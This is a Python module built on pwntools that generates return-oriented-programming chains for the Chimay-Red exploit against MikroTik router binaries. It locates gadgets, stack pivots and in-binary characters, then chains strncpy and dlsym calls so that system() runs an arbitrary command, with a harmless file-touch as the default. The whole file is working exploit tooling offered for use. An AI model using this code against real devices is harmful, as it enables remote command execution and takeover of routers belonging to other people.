"""
Generalized ROP module for Chimay-Red and MirkoDB
"""
import os
import random
import re
import string
from collections import namedtuple

from pwn import ROP, ELF, log, context
from pwnlib import asm


def _bfdarch_patch() -> str:
    arch = context.arch

    convert = {
        'i386': 'i386',
        'amd64': 'i386:x86-64',
        'thumb': 'arm',
        'ia64': 'ia64-elf64',
        'mips64': 'mips'
    }

    if arch in convert:
        arch = convert[arch]

    return arch


asm._bfdarch = _bfdarch_patch


class MikroROP(object):
    """
    MikroROP class
    """
    def __init__(self, binary: ELF, command=None):
        default_command = "/bin/touch /tmp/foobar-" + "".join(random.sample(string.ascii_letters, 5))

        self._chain = None
        self._offsets = None
        self._command = command or default_command

        with context.local():
            context.log_level = "WARNING"  # Suppress ELF metadata print from pwntools
            if isinstance(binary, str):
                if os.path.isfile(binary):
                    self.binary = binary = ELF(binary)
            if not isinstance(binary, ELF):
                self.binary = binary = ELF.from_bytes(b"\x90" * 262144, vma=0x8048000)
                self.rop = ROP([binary])
            else:
                self.binary = binary
                context.binary = self.binary.path
                self.rop = ROP([binary])
                context.arch = _bfdarch_patch()
                self.context = context

                self.build_offsets()

    def get_pthread_stacksize(self, lookahead=100) -> hex:
        """

        :param lookahead:
        :return:
        """
        thread_size = None

        address = self.binary.symbols[b"main"]
        disasm = self.binary.disasm(address, lookahead).split("\n")

        for num, line in zip(range(len(disasm)), disasm):
            if re.search(r"(e8 .* ff ff)", line):
                thread_attr = disasm[num - 2]
                if "push" in thread_attr:
                    thread_size = thread_attr.partition("push")[-1].strip()
                    break

        if not thread_size:
            return False

        return thread_size

    # TODO: Update mmips symbol fetching
    def get_plt_symbols(self, architecture: str) -> dict:
        plt_symbols = dict()

        try:
            if architecture is "x86" or "mips":
                for sym_name in (b"strncpy", b"dlsym"):
                    plt_symbols[sym_name.decode()] = self.binary.plt[sym_name]
        except KeyError:
            log.critical("Unkown error occured during fetching of symbols for " + architecture)
            raise

        return plt_symbols

    def generate_executable_segments(self) -> list:
        """

        :return:
        """
        executable_segments = list()

        for segment in self.binary.executable_segments:
            low = segment.header.p_vaddr
            high = segment.header.p_memsz + low

            if low or high:  # if not ZERO
                executable_segments.append((low, high))

        if not executable_segments:
            raise RuntimeError("Could not locate any executable segments in binary")

        return executable_segments

    def generate_writeable_segments(self) -> list:
        """

        :return:
        """
        writeable_segments = list()

        for segment in self.binary.writable_segments:
            low = segment.header.p_vaddr
            high = segment.header.p_memsz + low

            if low or high:  # if not ZERO
                writeable_segments.append((low, high))

        if not writeable_segments:
            raise RuntimeError("Could not locate any writeable segments in binary")

        return writeable_segments

    def generate_jmp_eax_gadget(self) -> int:
        """

        :return:
        """
        jmp_eax_re = re.compile(r"(.*jmp *eax)")

        for rx_segment_low, rx_segment_high in self.generate_executable_segments():
            for line in self.binary.disasm(rx_segment_low, rx_segment_high).split("\n"):
                if jmp_eax_re.search(line):
                    return int(str(line.split(":")[0].strip()), 16)

    def generate_stackpivots(self, architecture):
        """

        :param architecture:
        :return
        """
        # TODO
        arch_pivots = {
            "x86": {
                "pivot3ret": self.rop.search(regs=["esi", "edi", "ebp"]),
                "pivot2ret": self.rop.search(regs=["ebx", "ebp"]),
                "pivot1ret": self.rop.search(regs=["ebp"])
            },
            # "mips": {
            #     "pivot3ret": self.rop.search(regs=["esi", "edi", "ebp"]),
            #     "pivot2ret": self.rop.search(regs=["ebx", "ebp"]),
            #     "pivot1ret": self.rop.search(regs=["ebp"])
            # },
            # "arm": {
            #     "pivot3ret": self.rop.search(regs=["esi", "edi", "ebp"]),
            #     "pivot2ret": self.rop.search(regs=["ebx", "ebp"]),
            #     "pivot1ret": self.rop.search(regs=["ebp"])
            # }
        }

        stackpivots = arch_pivots.get(architecture)

        if not stackpivots:
            return False

        return stackpivots

    def generate_string_chunks(self, query: str):
        """

        :param query:
        :return:
        """
        return [[address for address in char][0] for char in [self.binary.search(char) for char in query + "\x00"]]

    def generate_ascii_chunks(self):
        """

        :return:
        """
        ascii_chunks = dict()
        for char in string.printable + "\x00":
            ascii_chunks[char] = [address for address in self.binary.search(char)][0] or None
        return ascii_chunks

    def build_offsets(self):
        """

        :return:
        """
        offsets = {
            "size": self.binary.data.__len__(),
            "base": self.binary.address,
            "thread_size": self.get_pthread_stacksize(),
            "segments": {
                "executable_segments": self.generate_executable_segments(),
                "writeable_segments": self.generate_writeable_segments()
            },
            "strings": {
                "ascii_chunks": self.generate_ascii_chunks(),
                "system": self.generate_writeable_segments()[1][0],
                "cmd": (self.generate_writeable_segments()[1][0] + (self.binary.bits >> 1)),
            },
            "gadgets": {
                "jmp_eax": self.generate_jmp_eax_gadget(),
                "pivot3ret": self.rop.search(regs=["esi", "edi", "ebp"]),
                "pivot2ret": self.rop.search(regs=["ebx", "ebp"]),
                "pivot1ret": self.rop.search(regs=["ebp"]),
            },
            "plt": {
                "strncpy": self.get_plt_symbols(self.binary.arch)["strncpy"],
                "dlsym": self.get_plt_symbols(self.binary.arch)["dlsym"]
            }
        }
        self._offsets = namedtuple("offsets", sorted(offsets))(**offsets)

        return True

    def build_ropchain(self, offsets=None):
        """
            Command Eg. "ls -la"

            system_chunks = [134512899, 134513152, 134512899, 134512854, 134514868, 134514240, 134512693]
                ("s", "y", "s", "t", "e", "m", "\x00")
            cmd_chunks = [134512899, 134513152, 134512899, 134512854, 134514868, 134514240, 134512693]
                ("l", "s", " ", "-", "l", "a", "\x00")

            Psuedocode:
            -----------------------------
            char_size = 1
            char_pointer = 0

            for address in cmd_chunks:
                rop.call(<strncpy>, args=(<writeable_segment_addr> + char_pointer, address, char_size))
                char_pointer += 1

            |<<<< rop.call(<dlsym>, args=(0, "system"))
            |
            |        eax = resultant pointer of dlsym()
            |
            |>>>> rop.call(<jmp eax>, args=(<command>))

            -----------------------------
        """

        char_size = 1
        cmd_chunks = list()
        system_chunks = list()

        if offsets:
            self._offsets = offsets
            for gadget_name, gadget in self.offsets.gadgets.items():
                if "pivot" in gadget_name:
                    self.binary.asm(gadget.address, "; ".join(gadget.insns))
            self.binary.save("/tmp/chimay_red.elf")

            with context.local():
                context.log_level = "WARNING"  # Suppress ELF metadata print from pwntools
                self.rop = ROP([ELF("/tmp/chimay_red.elf")])

        ascii_chunks = self.offsets.strings.get("ascii_chunks")
        if not ascii_chunks:
            log.critical("Offsets are currently not built!")

        for char in "system" + "\x00":
            if ascii_chunks.get(char):
                system_chunks.append(ascii_chunks[char])
            else:
                log.critical("Unable to locate enough readable characters in the binary to craft system chunks")

        for char in self.command + "\x00":
            if ascii_chunks.get(char):
                cmd_chunks.append(ascii_chunks[char])
            else:
                log.critical("Unable to locate enough readable characters in the binary to craft desired command")

        for length, address in zip(range(len(system_chunks)), system_chunks):
            self.rop.call(self.offsets.plt.get("strncpy"),
                [
                  self.offsets.strings.get("system") + length,
                  address,
                  char_size
                ])
        # print("EXPLOIT STAGE 1 (SYSTEM CHUNKS): ", hexlify(self.rop.chain()))

        for length, address in zip(range(len(cmd_chunks)), cmd_chunks):
            self.rop.call(self.offsets.plt.get("strncpy"),
                [
                  self.offsets.strings.get("cmd") + length,
                  address,
                  char_size
                ])
        # print("EXPLOIT STAGE 2 (CMD CHUNKS): ", hexlify(self.rop.chain()))

        self.rop.call(self.offsets.plt.get("dlsym"), [0, self.offsets.strings.get("system")])
        # print("EXPLOIT STAGE 3 (SYSTEM CHUNKS): ", hexlify(self.rop.chain()))

        self.rop.call(self.offsets.gadgets.get("jmp_eax"), [self.offsets.strings.get("cmd")])
        # print("EXPLOIT 4: ", hexlify(self.rop.chain()))

        self._chain = self.rop.chain()

    @property
    def command(self):
        """ The command property """
        return self._command

    @command.setter
    def command(self, value):
        self._command = value

    @property
    def offsets(self):
        """ The offsets property """
        return self._offsets

    @offsets.setter
    def offsets(self, value):
        self._offsets = value

    @property
    def chain(self):
        """ The ropchain property """
        return self._chain

    @chain.setter
    def chain(self, value):
        self._chain = value
